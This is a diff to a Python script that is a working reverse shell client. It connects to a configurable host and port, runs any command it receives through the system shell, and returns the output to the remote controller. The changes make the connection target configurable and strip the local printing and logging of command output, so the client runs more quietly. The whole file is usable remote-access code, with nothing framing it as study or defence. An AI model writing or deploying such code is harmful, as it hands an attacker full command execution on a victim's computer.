@@ -2,14 +2,17 @@ import socket
 import os
 import sys
 import subprocess
+import base64
 
 host_name = os.getlogin()
-filename = "data.txt"
 ip = socket.gethostbyname(host_name)
-print(ip)
+HOST = socket._LOCALHOST  # non-local => changer socket._LOCALHOST en votre ip
+PORT = 1268
+
+filename = "data_socket1.txt"
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server.connect((socket._LOCALHOST, 1268)) # non-local => changer socket._LOCALHOST en votre ip
+server.connect((HOST, PORT)) 
 
 print("connected")
 
@@ -21,12 +24,11 @@ while True:
             with open(os.path.join(os.environ['USERPROFILE'], filename), "w") as f:
                 proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
                 out, err = proc.communicate()
-                f.write(out.decode("utf-8"))
-                print("client : ",out)
                 server.send(out)
         except Exception as e:
             print("error", e)
-            server.send(f"Error : {ip} => {e}".encode())
+            server.send(f"Client Error : {ip} => {e}".encode())
+            sys.exit()
 
 
 
